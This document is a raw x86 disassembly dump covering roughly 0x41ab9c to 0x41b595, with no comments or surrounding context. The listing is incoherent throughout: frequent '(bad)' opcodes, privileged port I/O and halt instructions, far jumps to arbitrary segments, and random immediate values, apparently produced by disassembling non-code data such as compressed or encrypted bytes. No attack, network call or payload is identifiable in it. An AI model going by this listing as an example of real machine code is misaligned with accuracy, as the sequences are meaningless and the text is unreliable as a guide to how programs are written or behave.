  41ab9c:	stc    
  41ab9d:	(bad)  
  41ab9e:	fwait
  41ab9f:	fwait
  41aba0:	mov    ecx,0x8941b1dd
  41aba5:	ins    DWORD PTR es:[edi],dx
  41aba6:	arpl   bp,sp
  41aba8:	imul   esi
  41abaa:	fnsave [ebx]
  41abac:	adc    BYTE PTR [edx+0x624b0cdb],cl
  41abb2:	add    ebp,esp
  41abb4:	inc    edx
  41abb5:	cs aaa 
  41abb7:	cdq    
  41abb8:	xor    eax,0x86bd38c5
  41abbd:	gs dec eax
  41abbf:	outs   dx,DWORD PTR ds:[esi]
  41abc0:	rol    BYTE PTR [esi],0x9a
  41abc3:	add    BYTE PTR [edx+0x2a971beb],ch
  41abc9:	cmc    
  41abca:	mov    bl,0xa0
  41abcc:	std    
  41abcd:	jne    0x41ab7f
  41abcf:	and    BYTE PTR [ecx+ebx*1],bl
  41abd2:	push   edi
  41abd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd4:	inc    edx
  41abd5:	setnp  BYTE PTR [edi+0x59]
  41abd9:	clc    
  41abda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abdb:	rcr    esp,0x7e
  41abde:	call   0xc333242b
  41abe3:	xchg   ebp,eax
  41abe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe5:	pop    esp
  41abe6:	inc    esp
  41abe7:	scas   al,BYTE PTR es:[edi]
  41abe8:	ror    dh,1
  41abea:	arpl   WORD PTR [eax-0x24],bx
  41abed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abee:	cmp    ch,BYTE PTR [edx-0x2f17c7f0]
  41abf4:	not    ebx
  41abf6:	aam    0xdb
  41abf8:	mov    ds:0x3f5b8b5a,al
  41abfd:	jno    0x41abd0
  41abff:	aaa    
  41ac00:	push   ds
  41ac01:	add    esp,0xffffffde
  41ac04:	or     DWORD PTR [ebx],ebp
  41ac06:	loopne 0x41abde
  41ac08:	sti    
  41ac09:	(bad)  
  41ac0a:	sbb    eax,0xa5d222f3
  41ac0f:	repnz add BYTE PTR [eax],al
	...
  41ac72:	add    BYTE PTR [eax],al
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ecx+ebx*8+0x4d]
  41ac82:	fsub   DWORD PTR [eax+eax*1+0x1c]
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    al,0x1
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	mov    eax,0xaa8bfb8c
  41ac91:	mov    ah,0x56
  41ac93:	jbe    0x41ac56
  41ac95:	rol    BYTE PTR [esi-0x4a],cl
  41ac98:	or     dl,al
  41ac9a:	arpl   WORD PTR [edi-0x4b],bp
  41ac9d:	hlt    
  41ac9e:	pusha  
  41ac9f:	or     esi,DWORD PTR [eax]
  41aca1:	clc    
  41aca2:	jle    0x41ace8
  41aca4:	xchg   ebx,eax
  41aca5:	sbb    bh,BYTE PTR [edi-0x43]
  41aca8:	hlt    
  41aca9:	mov    al,0xb0
  41acab:	retf   
  41acac:	imul   eax,DWORD PTR [ecx+0xa],0xffffff96
  41acb0:	aaa    
  41acb1:	add    DWORD PTR [ebp+0x4c944f13],ebx
  41acb7:	jmp    0x91ee8bdc
  41acbc:	jb     0x41ad2d
  41acbe:	imul   eax,DWORD PTR [ebx],0x49
  41acc1:	jae    0x41ad26
  41acc3:	sbb    BYTE PTR [ebx-0x75],cl
  41acc6:	push   ds
  41acc7:	shl    DWORD PTR [eax+0x19],0x10
  41accb:	ja     0x41acc4
  41accd:	mov    al,ds:0xaab86782
  41acd2:	outs   dx,DWORD PTR ds:[esi]
  41acd3:	cmp    ebp,DWORD PTR [ebp-0x19]
  41acd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acd7:	repz pop ds
  41acd9:	inc    ebx
  41acda:	add    esp,DWORD PTR [ebx+eax*4+0x7d]
  41acde:	hlt    
  41acdf:	jge    0x41acb2
  41ace1:	mov    edx,0x56a0bd3
  41ace6:	scas   al,BYTE PTR es:[edi]
  41ace7:	cmp    DWORD PTR [esi+0x2a033e51],edx
  41aced:	loop   0x41ad62
  41acef:	repz mov cl,0x9
  41acf2:	add    dh,BYTE PTR [ecx]
  41acf4:	mov    edi,0xfc5add83
  41acf9:	out    0x86,al
  41acfb:	push   edx
  41acfc:	adc    esi,DWORD PTR [ebp-0x7a]
  41acff:	dec    esp
  41ad00:	sar    ah,cl
  41ad02:	mov    cl,0xe5
  41ad04:	xchg   BYTE PTR [esi+0x585c5011],bl
  41ad0a:	pcmpeqb mm1,QWORD PTR [edi+0x52544d61]
  41ad11:	retf   
  41ad12:	ins    DWORD PTR es:[edi],dx
  41ad13:	add    al,0x25
  41ad15:	mov    cs,WORD PTR [ecx+0x344eb180]
  41ad1b:	cs mov dl,0x70
  41ad1e:	xor    al,0xbb
  41ad20:	inc    ebp
  41ad21:	adc    eax,0x916f3d3b
  41ad26:	cwde   
  41ad27:	add    eax,ebx
  41ad29:	stos   BYTE PTR es:[edi],al
  41ad2a:	jge    0x41acd4
  41ad2c:	jno    0x41acd6
  41ad2e:	das    
  41ad2f:	and    edi,DWORD PTR [ecx]
  41ad31:	jl     0x41ad9f
  41ad33:	fadd   DWORD PTR [edi]
  41ad35:	mov    eax,0xa7402eb
  41ad3a:	push   eax
  41ad3b:	(bad)
  41ad3e:	push   es
  41ad3f:	dec    ebp
  41ad40:	dec    edi
  41ad41:	nop
  41ad42:	lds    ebp,FWORD PTR [edi+edi*8-0x23]
  41ad46:	mov    dh,0x1b
  41ad48:	ins    DWORD PTR es:[edi],dx
  41ad49:	mov    dl,0x7f
  41ad4b:	jle    0x41ada5
  41ad4d:	in     eax,dx
  41ad4e:	js     0x41ad16
  41ad50:	setl   ah
  41ad53:	and    DWORD PTR [esi-0x7c],edx
  41ad56:	and    al,0xee
  41ad58:	cdq    
  41ad59:	jno    0x41ad4d
  41ad5b:	cld    
  41ad5c:	xchg   edi,eax
  41ad5d:	xchg   ecx,eax
  41ad5e:	jmp    0x1531:0x86a82cba
  41ad65:	pop    es
  41ad66:	and    eax,0xf9a48ece
  41ad6b:	jecxz  0x41ad47
  41ad6d:	inc    ecx
  41ad6e:	and    al,0xf3
  41ad70:	mul    BYTE PTR [edx-0x6]
  41ad73:	ret    
  41ad74:	enter  0xfa22,0x59
  41ad78:	fisubr DWORD PTR ds:[edx-0x6b4c78b8]
  41ad7f:	popa   
  41ad80:	mul    BYTE PTR [ebp+0x634889e6]
  41ad86:	xchg   edx,eax
  41ad87:	not    BYTE PTR [edx+0x57]
  41ad8a:	scas   eax,DWORD PTR es:[edi]
  41ad8b:	repz sub al,0xf8
  41ad8e:	mov    ds:0x91,al
	...
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [esi+eiz*4+0x4e8f505],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	cmp    bh,BYTE PTR [ecx+0x75]
  41ae0f:	sub    al,0x99
  41ae11:	jnp    0x41ada4
  41ae13:	retf   
  41ae14:	add    dl,BYTE PTR [edx+0x4507fed9]
  41ae1a:	push   0x1d4fa16c
  41ae1f:	xchg   esi,eax
  41ae20:	leave  
  41ae21:	adc    eax,esp
  41ae23:	jl     0x41ae7f
  41ae25:	ins    DWORD PTR es:[edi],dx
  41ae26:	pop    edx
  41ae27:	or     al,0xdc
  41ae29:	clc    
  41ae2a:	fnstenv [edi+0x41f1ee2]
  41ae30:	jp     0x41ae27
  41ae32:	and    ecx,DWORD PTR [eax+0x5ac8c570]
  41ae38:	call   0xc882613f
  41ae3d:	ins    DWORD PTR es:[edi],dx
  41ae3e:	(bad)  
  41ae3f:	mov    ebp,0x2ef37c6
  41ae44:	js     0x41aeb8
  41ae46:	(bad)  
  41ae47:	fcom   QWORD PTR [edx-0x327205f4]
  41ae4d:	mov    ds:0xa947d4cf,eax
  41ae52:	std    
  41ae53:	mov    dl,BYTE PTR [edi]
  41ae55:	pushf  
  41ae56:	test   DWORD PTR [ecx+0x65],eax
  41ae59:	mov    al,ds:0x84916456
  41ae5e:	push   edx
  41ae5f:	pop    ss
  41ae60:	pop    ecx
  41ae61:	pop    ss
  41ae62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae63:	js     0x41adea
  41ae65:	std    
  41ae66:	cli    
  41ae67:	adc    ebp,edi
  41ae69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae6a:	xor    ecx,ebx
  41ae6c:	jno    0x41adf8
  41ae6e:	mov    dl,0x8c
  41ae70:	cmp    dh,cl
  41ae72:	xor    al,0xbb
  41ae74:	cmp    BYTE PTR ds:0xecbd2610,dl
  41ae7a:	ins    DWORD PTR es:[edi],dx
  41ae7b:	retf   
  41ae7c:	ficom  DWORD PTR [ebx-0x45285648]
  41ae82:	sbb    eax,0x23b9c2c8
  41ae87:	je     0x41ae59
  41ae89:	outs   dx,BYTE PTR ds:[esi]
  41ae8a:	jbe    0x41ae27
  41ae8c:	mov    ecx,0xa7537d3c
  41ae91:	aas    
  41ae92:	enter  0xff0,0x34
  41ae96:	ror    ebx,1
  41ae98:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae9a:	jo     0x41ae4f
  41ae9c:	cdq    
  41ae9d:	aad    0xcc
  41ae9f:	adc    al,0x14
  41aea1:	cmp    DWORD PTR [ebp-0x28],eax
  41aea4:	fbstp  TBYTE PTR [ebp+0x74e15c61]
  41aeaa:	adc    edx,0xffffffa7
  41aead:	gs das 
  41aeaf:	or     BYTE PTR [edi-0x49],cl
  41aeb2:	cdq    
  41aeb3:	into   
  41aeb4:	jecxz  0x41aecb
  41aeb6:	mov    bl,0xf5
  41aeb8:	les    ecx,FWORD PTR [edx+0x6c]
  41aebb:	sub    al,0xbd
  41aebd:	jp     0x41aea7
  41aebf:	sub    eax,0x409bb36
  41aec4:	mov    ah,0xec
  41aec6:	rcr    BYTE PTR ds:0x10f431b2,0x2c
  41aecd:	fistp  QWORD PTR [esp+edi*2+0x30]
  41aed1:	xor    DWORD PTR [edx],ecx
  41aed3:	(bad)
  41aed7:	lea    edi,[esi]
  41aed9:	shl    DWORD PTR [ebx+0x61],0x6c
  41aedd:	jg     0x41aea3
  41aedf:	pop    ecx
  41aee0:	dec    ecx
  41aee1:	mov    ebx,ecx
  41aee3:	mov    esi,0xe0042af5
  41aee8:	arpl   di,si
  41aeea:	jmp    0x41aeab
  41aeec:	test   eax,0x7c2877a7
  41aef1:	pop    ebp
  41aef2:	out    0x9c,al
  41aef4:	push   edi
  41aef5:	ss jmp 0xa84a:0x74f7b93
  41aefd:	cld    
  41aefe:	or     DWORD PTR [eax+0x16d6f8fd],ebx
  41af04:	jecxz  0x41aea2
  41af06:	dec    edx
  41af07:	in     al,0xdf
  41af09:	jmp    0x3fd7:0xb448d300
	...
  41af74:	(bad)  
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x751144ee
  41af82:	mov    BYTE PTR [ebp+0x11e08],bh
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	push   es
  41af8d:	adc    eax,0x8ce0c7fb
  41af92:	lds    ebx,FWORD PTR [ebx+eiz*8+0x6a]
  41af96:	mov    ebx,0xd5e2a6d1
  41af9b:	xor    BYTE PTR [esi+0x37],dl
  41af9e:	add    eax,DWORD PTR [esi-0x72f869fd]
  41afa4:	mov    eax,0xa126ba4
  41afa9:	fwait
  41afaa:	mov    DWORD PTR ds:0xf2802421,edx
  41afb0:	fwait
  41afb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afb2:	and    al,0x3a
  41afb4:	enter  0x6c0b,0x46
  41afb8:	jecxz  0x41b031
  41afba:	jno    0x41b03b
  41afbc:	pop    ebp
  41afbd:	cdq    
  41afbe:	inc    esi
  41afbf:	shl    BYTE PTR es:[eax-0x3ec2dab2],cl
  41afc6:	pop    esp
  41afc7:	sub    al,0xac
  41afc9:	cmp    ebx,DWORD PTR [ecx+0x29fba47f]
  41afcf:	dec    BYTE PTR [edi]
  41afd1:	push   eax
  41afd2:	out    0xb1,eax
  41afd4:	dec    esi
  41afd5:	inc    esp
  41afd6:	sbb    esi,DWORD PTR ds:0xdd6108cf
  41afdc:	push   ebp
  41afdd:	sub    al,0x7
  41afdf:	(bad)  
  41afe0:	push   DWORD PTR [ecx-0x65356593]
  41afe6:	test   eax,0xa17c624b
  41afeb:	jge    0x41af73
  41afed:	(bad)  
  41afee:	mov    edi,0x578002c4
  41aff3:	dec    ebp
  41aff4:	out    0xbd,al
  41aff6:	add    BYTE PTR [edx-0x2a842e1d],dh
  41affc:	and    dl,BYTE PTR [ebx]
  41affe:	fwait
  41afff:	jle    0x41b058
  41b001:	retf   0xc808
  41b004:	test   al,0xa9
  41b006:	and    al,0xea
  41b008:	add    eax,0xd39aee7b
  41b00d:	mov    cs,WORD PTR [ebp-0x4030dfa0]
  41b013:	xchg   esi,eax
  41b014:	rep repnz lods al,BYTE PTR ds:[esi]
  41b017:	or     DWORD PTR [edi+0x1f],esp
  41b01a:	cmp    al,ah
  41b01c:	sti    
  41b01d:	xchg   ebp,eax
  41b01e:	shr    BYTE PTR [ebp+eax*8-0x576d39a1],0xda
  41b026:	pop    ecx
  41b027:	jnp    0x41b05d
  41b029:	(bad)  
  41b02a:	scas   al,BYTE PTR es:[edi]
  41b02b:	cmp    al,0x96
  41b02d:	sub    dl,BYTE PTR [ebx]
  41b02f:	ret    
  41b030:	jno    0x41b035
  41b032:	imul   ebp,DWORD PTR [eax+0x4266cacd],0x0
  41b039:	lds    edi,FWORD PTR [ecx]
  41b03b:	adc    eax,0x885114c
  41b040:	xlat   BYTE PTR ds:[ebx]
  41b041:	rcl    DWORD PTR [esi],0xff
  41b044:	sbb    eax,0x7a319a9
  41b049:	outs   dx,DWORD PTR ds:[esi]
  41b04a:	(bad)  
  41b04b:	mov    ecx,0x859cd7f
  41b050:	adc    dl,BYTE PTR [esi]
  41b052:	pusha  
  41b053:	xchg   esp,eax
  41b054:	or     al,0xf9
  41b056:	mov    eax,0xd09c4704
  41b05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b05c:	(bad)  
  41b05d:	jne    0x41b056
  41b05f:	icebp  
  41b060:	push   0x7a4512df
  41b065:	push   ebx
  41b066:	mov    esi,0xd062749c
  41b06b:	cli    
  41b06c:	mov    ebx,0x536d303c
  41b071:	sub    BYTE PTR [ecx],al
  41b073:	inc    edx
  41b074:	xor    ecx,DWORD PTR [ecx-0x2a]
  41b077:	cmovbe esi,DWORD PTR [esi+edx*4]
  41b07b:	fwait
  41b07c:	mov    eax,ds:0x6c9f4294
  41b081:	(bad)  
  41b082:	daa    
  41b083:	push   ecx
  41b084:	ins    DWORD PTR es:[edi],dx
  41b085:	ja     0x41b05d
  41b087:	sbb    DWORD PTR [esi+ebp*2],ecx
  41b08a:	mov    ebx,0xadbd4c0c
  41b08f:	in     eax,0x0
	...
  41b0f1:	add    BYTE PTR [eax],al
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xa4894a78
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b10d:	inc    edx
  41b10e:	pop    edi
  41b10f:	push   eax
  41b110:	xor    BYTE PTR [edx-0x524b7c0b],dh
  41b116:	add    ebx,DWORD PTR [ecx+ebp*8-0x176db920]
  41b11d:	sbb    edx,DWORD PTR [esi-0xbacd7d6]
  41b123:	inc    ebx
  41b124:	call   0xd5465799
  41b129:	cmp    ecx,esi
  41b12b:	retf   
  41b12c:	es mov ch,0xb5
  41b12f:	ds mov bl,0xb7
  41b132:	sahf   
  41b133:	popa   
  41b134:	test   eax,0x9c1e68d1
  41b139:	add    edi,DWORD PTR [edx-0xa8474ca]
  41b13f:	stc    
  41b140:	jo     0x41b0e7
  41b142:	(bad)  
  41b143:	out    dx,al
  41b144:	(bad)  
  41b145:	ffree  st(0)
  41b147:	fld    QWORD PTR [edi*4-0x59e1a4a3]
  41b14e:	jmp    0x3a640c50
  41b153:	jmp    0xb42e:0xdd053222
  41b15a:	cmp    DWORD PTR [eax-0x3f],esp
  41b15d:	call   0x7d:0x2b02beb0
  41b164:	mov    WORD PTR [edi],gs
  41b166:	aas    
  41b167:	ins    BYTE PTR es:[edi],dx
  41b168:	xrelease xchg DWORD PTR [esi+0x3d11f582],ebx
  41b16f:	popa   
  41b170:	(bad)
  41b173:	test   DWORD PTR [eax+0x38],eax
  41b176:	aas    
  41b177:	mov    cl,BYTE PTR [ebp-0x4f]
  41b17a:	and    al,0x85
  41b17c:	icebp  
  41b17d:	adc    eax,0x86078c53
  41b182:	jae    0x41b163
  41b184:	sbb    eax,0x2e8d29f3
  41b189:	mov    eax,eax
  41b18b:	int    0xd0
  41b18d:	push   eax
  41b18e:	retf   0x6855
  41b191:	je     0x41b188
  41b193:	pop    ecx
  41b194:	mov    es,ebx
  41b196:	pushf  
  41b197:	(bad)  
  41b198:	hlt    
  41b199:	inc    BYTE PTR [eax+0x3ddb2826]
  41b19f:	sub    ebp,ebx
  41b1a1:	push   edx
  41b1a2:	jno    0x41b178
  41b1a4:	lds    eax,FWORD PTR [esi]
  41b1a6:	pop    edi
  41b1a7:	shl    BYTE PTR [edi],1
  41b1a9:	or     cl,BYTE PTR [eax+0x28]
  41b1ac:	loop   0x41b190
  41b1ae:	adc    eax,0xeddfd251
  41b1b3:	inc    esi
  41b1b4:	mov    al,ds:0x21b65c86
  41b1b9:	test   eax,0x8cb8e79c
  41b1be:	retf   0x56d
  41b1c1:	dec    edi
  41b1c2:	ins    BYTE PTR es:[edi],dx
  41b1c3:	xchg   ebp,eax
  41b1c4:	inc    ebp
  41b1c5:	jb     0x41b164
  41b1c7:	popf   
  41b1c8:	mov    bl,0xe7
  41b1ca:	call   0xf5bca592
  41b1cf:	xor    dh,0x79
  41b1d2:	call   0x7baf:0x2ff6be4b
  41b1d9:	in     al,dx
  41b1da:	gs push edx
  41b1dc:	nop
  41b1dd:	mov    eax,0x993a98a
  41b1e2:	fistp  DWORD PTR [eax-0x6a73c6fa]
  41b1e8:	add    bl,0x86
  41b1eb:	xlat   BYTE PTR ds:[ebx]
  41b1ec:	call   0xeb23b7e8
  41b1f1:	sti    
  41b1f2:	push   ds
  41b1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1f4:	fwait
  41b1f5:	push   esp
  41b1f6:	or     edx,eax
  41b1f8:	loopne 0x41b1ea
  41b1fa:	mov    eax,ds:0x8aeb3954
  41b1ff:	cmc    
  41b200:	and    al,0xf3
  41b202:	into   
  41b203:	loope  0x41b262
  41b205:	cmp    al,0x56
  41b207:	inc    eax
  41b208:	sub    al,0x12
  41b20a:	mov    eax,ds:0xf472bf5
  41b20f:	push   ebx
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     ch,dl
  41b281:	cmp    ecx,esi
  41b283:	dec    esp
  41b284:	adc    BYTE PTR [eax],ah
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    al,0x1
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	jns    0x41b24f
  41b28e:	mov    cl,0x34
  41b290:	jns    0x41b2e7
  41b292:	or     DWORD PTR [ecx-0x1d],ebp
  41b295:	dec    ebx
  41b296:	jae    0x41b309
  41b298:	neg    BYTE PTR [edx+esi*1+0x2a4c0fdf]
  41b29f:	xlat   BYTE PTR ds:[ebx]
  41b2a0:	adc    DWORD PTR [edi-0x19],eax
  41b2a3:	aaa    
  41b2a4:	lahf   
  41b2a5:	stos   DWORD PTR es:[edi],eax
  41b2a6:	stos   BYTE PTR es:[edi],al
  41b2a7:	les    ebx,FWORD PTR [eax*8-0x105d1fac]
  41b2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2af:	and    BYTE PTR [edx*8-0x290ffc1b],dh
  41b2b6:	inc    ebx
  41b2b7:	outs   dx,DWORD PTR ds:[esi]
  41b2b8:	hlt    
  41b2b9:	ret    0xef5d
  41b2bc:	aas    
  41b2bd:	mov    ebp,0xf9db46de
  41b2c2:	jle    0x41b262
  41b2c4:	mov    ch,0x31
  41b2c6:	or     DWORD PTR [esi-0x29745ab8],eax
  41b2cc:	mov    edi,DWORD PTR [ecx]
  41b2ce:	rcr    DWORD PTR [edx+edi*4+0x442378cb],cl
  41b2d5:	pop    eax
  41b2d6:	push   cs
  41b2d7:	in     al,dx
  41b2d8:	dec    edx
  41b2d9:	sub    DWORD PTR [ebx+edx*2+0x1f],ebp
  41b2dd:	xor    esp,DWORD PTR [edx+0x35]
  41b2e0:	fwait
  41b2e1:	cmp    DWORD PTR [edx+0x1a],ebp
  41b2e4:	daa    
  41b2e5:	cmp    ecx,edi
  41b2e7:	mov    dh,0x5c
  41b2e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2ea:	sahf   
  41b2eb:	pop    edi
  41b2ec:	add    DWORD PTR [edx+0x5aa6e4e1],esi
  41b2f2:	ss jp  0x41b322
  41b2f5:	(bad)  
  41b2f6:	xlat   BYTE PTR ds:[ebx]
  41b2f7:	jno    0x41b35a
  41b2f9:	or     al,0xd1
  41b2fb:	outs   dx,DWORD PTR ds:[esi]
  41b2fc:	call   0xd845014a
  41b301:	dec    esp
  41b302:	in     eax,dx
  41b303:	test   BYTE PTR [ecx+0x58],ch
  41b306:	jl     0x41b368
  41b308:	dec    esi
  41b309:	clc    
  41b30a:	adc    eax,0x6e9d5fec
  41b30f:	and    dh,ch
  41b311:	shr    esp,1
  41b313:	scas   eax,DWORD PTR es:[edi]
  41b314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b315:	sahf   
  41b316:	pop    ebx
  41b317:	int3   
  41b318:	mov    al,ds:0x6a0078fa
  41b31d:	inc    ecx
  41b31e:	in     al,0x5b
  41b320:	jecxz  0x41b364
  41b322:	and    al,0x7
  41b324:	nop
  41b325:	mov    bh,0x69
  41b327:	cli    
  41b328:	push   ds
  41b329:	inc    edx
  41b32a:	and    edi,esp
  41b32c:	lahf   
  41b32d:	and    DWORD PTR [edi+ecx*4],esi
  41b330:	fldenv [esi]
  41b332:	mov    ebp,0xa642b2e
  41b337:	sub    edi,DWORD PTR [ecx+0x2a]
  41b33a:	aad    0x22
  41b33c:	dec    eax
  41b33d:	shl    esp,1
  41b33f:	xchg   BYTE PTR [esi-0x68773d0a],al
  41b345:	push   es
  41b346:	cmp    al,0x6a
  41b348:	rol    DWORD PTR [ebp+0x75],0x61
  41b34c:	push   ds
  41b34d:	mov    ds:0x7f66b2a,al
  41b352:	cmp    al,0x74
  41b354:	jmp    0xa11e:0x345e6caa
  41b35b:	into   
  41b35c:	xchg   ebp,eax
  41b35d:	call   0x5e4d3920
  41b362:	jno    0x41b371
  41b364:	stc    
  41b365:	retf   
  41b366:	popf   
  41b367:	test   al,0x3c
  41b369:	cdq    
  41b36a:	add    BYTE PTR [ebx+edx*4],bh
  41b36d:	leave  
  41b36e:	call   0x525e:0x873f9ed
  41b375:	xlat   BYTE PTR ds:[ebx]
  41b376:	(bad)  
  41b377:	fisttp DWORD PTR [ebp-0x7f6f31aa]
  41b37d:	xor    dl,BYTE PTR [ecx-0x31fdbcaf]
  41b383:	pop    es
  41b384:	xchg   esi,eax
  41b385:	test   eax,0xa53c646e
  41b38a:	test   eax,0x9c071005
  41b38f:	repnz add BYTE PTR [eax],al
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	aas    
  41b401:	jle    0x41b430
  41b403:	pop    es
  41b404:	adc    al,0x21
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	sub    DWORD PTR [ecx-0x50e1ad75],edi
  41b412:	dec    edi
  41b413:	nop
  41b414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b415:	inc    esi
  41b416:	jns    0x41b42a
  41b418:	pop    eax
  41b419:	xlat   BYTE PTR ds:[ebx]
  41b41a:	xlat   BYTE PTR ds:[ebx]
  41b41b:	fldcw  WORD PTR cs:[eax+edi*8]
  41b41f:	imul   ebx,DWORD PTR [edx],0x48
  41b422:	test   DWORD PTR [ebp+0xc],edi
  41b425:	and    ah,BYTE PTR [eax]
  41b427:	cmp    cl,BYTE PTR ds:0x568b1008
  41b42d:	pop    ebx
  41b42e:	stos   DWORD PTR es:[edi],eax
  41b42f:	arpl   WORD PTR [eax],bx
  41b431:	sub    edi,DWORD PTR [ebx-0x750b7399]
  41b437:	les    edi,FWORD PTR [esi]
  41b439:	mov    edi,0x4af6da40
  41b43e:	shr    BYTE PTR [ebx-0x8],cl
  41b441:	retf   
  41b442:	sub    ebx,DWORD PTR ds:0xabe52c3f
  41b448:	jns    0x41b408
  41b44a:	cs pop es
  41b44c:	ja     0x41b4b8
  41b44e:	dec    edi
  41b44f:	imul   ebx,DWORD PTR [ebx+0x22],0x19
  41b453:	add    al,0xfa
  41b455:	jp     0x41b4d0
  41b457:	add    eax,0xd707d2b0
  41b45c:	stos   BYTE PTR es:[edi],al
  41b45d:	dec    eax
  41b45e:	(bad)  
  41b460:	pop    esi
  41b461:	jmp    0x5c015386
  41b466:	sub    al,0xd6
  41b468:	inc    ebp
  41b469:	pop    edi
  41b46a:	cwde   
  41b46b:	out    dx,eax
  41b46c:	xlat   BYTE PTR ds:[ebx]
  41b46d:	je     0x41b3fa
  41b46f:	dec    esi
  41b470:	neg    DWORD PTR [eax]
  41b472:	jae    0x41b4df
  41b474:	jl     0x41b4b4
  41b476:	push   ebx
  41b477:	push   0x3e3edecc
  41b47c:	leave  
  41b47d:	add    BYTE PTR [ebx-0x36],0x41
  41b481:	mov    eax,ds:0x1f3db727
  41b486:	push   ebp
  41b487:	sar    BYTE PTR [ecx],0x79
  41b48a:	into   
  41b48b:	jg     0x41b473
  41b48d:	xchg   esp,eax
  41b48e:	mov    ecx,0x3a0bb97e
  41b493:	lods   eax,DWORD PTR ds:[esi]
  41b494:	outs   dx,DWORD PTR ds:[esi]
  41b495:	ret    0x9ff8
  41b498:	xor    eax,0x4df07afa
  41b49d:	cmp    DWORD PTR [eax-0x30],0xffffffe9
  41b4a1:	test   DWORD PTR ds:0xdaabd957,esp
  41b4a7:	pop    es
  41b4a8:	in     eax,0xf
  41b4aa:	mov    ch,0xf3
  41b4ac:	(bad)  
  41b4ae:	repz fnstcw WORD PTR [ebx-0x33f8d2c5]
  41b4b5:	jnp    0x41b472
  41b4b7:	jg     0x41b51c
  41b4b9:	xchg   ebx,eax
  41b4ba:	sub    ebx,ebp
  41b4bc:	mov    edi,esp
  41b4be:	popa   
  41b4bf:	add    eax,0x83eb0b67
  41b4c4:	mov    bh,0xc1
  41b4c6:	add    eax,0x25e73eb7
  41b4cb:	push   cs
  41b4cc:	pop    es
  41b4cd:	(bad)  
  41b4ce:	in     eax,dx
  41b4cf:	js     0x41b46c
  41b4d1:	ins    BYTE PTR es:[edi],dx
  41b4d2:	xor    BYTE PTR [esi+0x7b],0x89
  41b4d6:	and    ah,BYTE PTR [ecx+0x7fd7ec2e]
  41b4dc:	ins    DWORD PTR es:[edi],dx
  41b4dd:	inc    edi
  41b4de:	ja     0x41b523
  41b4e0:	push   0x72
  41b4e2:	lock popf 
  41b4e4:	stos   BYTE PTR es:[edi],al
  41b4e5:	outs   dx,DWORD PTR ds:[esi]
  41b4e6:	pop    ss
  41b4e7:	adc    esi,DWORD PTR [esi]
  41b4e9:	lds    eax,FWORD PTR [ecx-0x58]
  41b4ec:	in     eax,0xa2
  41b4ee:	jmp    0xa50:0x49518ec3
  41b4f5:	inc    ecx
  41b4f6:	test   DWORD PTR [edi],esi
  41b4f8:	sbb    ch,al
  41b4fa:	fmul   DWORD PTR [ecx-0x3097e254]
  41b500:	cmp    bl,BYTE PTR [edx-0x46]
  41b503:	xchg   ebx,eax
  41b504:	mov    cl,BYTE PTR [edi-0x32370076]
  41b50a:	jo     0x41b548
  41b50c:	sub    eax,0x24a1de
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	fnstcw WORD PTR [edx+0x22185243]
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    al,0x1
  41b58a:	add    BYTE PTR [eax],al
  41b58c:	lods   al,BYTE PTR ds:[esi]
  41b58d:	mov    bh,0xf1
  41b58f:	dec    ebp
  41b590:	or     eax,0x56f8d130
  41b595:	and    al,0x8e
